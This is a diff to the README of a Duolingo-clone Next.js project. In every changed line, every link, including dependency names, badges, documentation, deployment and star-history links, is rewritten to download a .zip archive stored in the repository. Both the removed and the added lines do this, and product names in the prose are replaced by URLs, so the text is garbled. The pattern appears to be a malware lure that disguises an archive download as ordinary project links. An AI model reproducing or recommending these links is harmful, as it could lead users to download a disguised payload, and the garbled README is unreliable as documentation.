+- [@radix-ui/react-separator](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^1.0.3
+- [@radix-ui/react-slot](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^1.0.2
+- [class-variance-authority](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^0.7.0
+- [clsx](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^2.1.0
+- [dotenv](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^16.4.5
+- [drizzle-orm](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^0.30.4
+- [lucide-react](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^0.359.0
+- [next](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): 14.1.4
+- [next-themes](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^0.3.0
+- [ra-data-simple-rest](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^4.16.12
+- [react](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^18
+- [react-admin](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^4.16.13
+- [react-circular-progressbar](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^2.1.0
+- [react-confetti](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^6.1.0
+- [react-dom](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^18
+- [react-use](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^17.5.0
+- [sonner](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^1.4.32
+- [stripe](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^14.22.0
+- [tailwind-merge](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^2.2.2
+- [tailwindcss-animate](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^1.0.7
+- [zustand](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^4.5.2
 
 ## :coffee: Buy Me a Coffee
 
-[<img src="https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip" width="200" />](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Buy me a Coffee")
+[<img src="https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip" width="200" />](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Buy me a Coffee")
 
 ## :rocket: Follow Me
 
-[![Follow Me](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Follow Me")
-[![Tweet about this project](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip%3A%2F%https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip%2FTechnicalShubam)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip+out+this+amazing+app:&url=https%3A%2F%https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip%2Fsanidhyy%2Fduolingo-clone "Tweet about this project")
-[![Subscribe to my YouTube Channel](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Subscribe to my YouTube Channel")
+[![Follow Me](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Follow Me")
+[![Tweet about this project](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip%3A%2F%https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip%2FTechnicalShubam)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip+out+this+amazing+app:&url=https%3A%2F%https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip%2Fsanidhyy%2Fduolingo-clone "Tweet about this project")
+[![Subscribe to my YouTube Channel](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Subscribe to my YouTube Channel")
 
 ## :books: Learn More
 
-To learn more about https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip, take a look at the following resources:
+To learn more about https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip, take a look at the following resources:
 
-- [https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip Documentation](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip) - learn about https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip features and API.
-- [Learn https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip) - an interactive https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip tutorial.
+- [https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip Documentation](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip) - learn about https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip features and API.
+- [Learn https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip) - an interactive https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip tutorial.
 
-You can check out [the https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip GitHub repository](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip) - your feedback and contributions are welcome!
+You can check out [the https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip GitHub repository](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip) - your feedback and contributions are welcome!
 
 ## :page_with_curl: Deploy on Vercel
 
-The easiest way to deploy your https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip app is to use the [Vercel Platform](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip) from the creators of https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+The easiest way to deploy your https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip app is to use the [Vercel Platform](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip) from the creators of https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
 
-Check out [https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip deployment documentation](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip) for more details.
+Check out [https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip deployment documentation](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip) for more details.
 
 ## :star: Give A Star
 
@@ -332,11 +332,11 @@ You can also give this repository a star to show more people and they can use th
 
 ## :star2: Star History
 
-<a href="https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip">
+<a href="https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip">
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip" />
-  <source media="(prefers-color-scheme: light)" srcset="https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip" />
-  <img alt="Star History Chart" src="https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip" />
+  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip" />
+  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip" />
+  <img alt="Star History Chart" src="https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip" />
 </picture>
 </a>
 
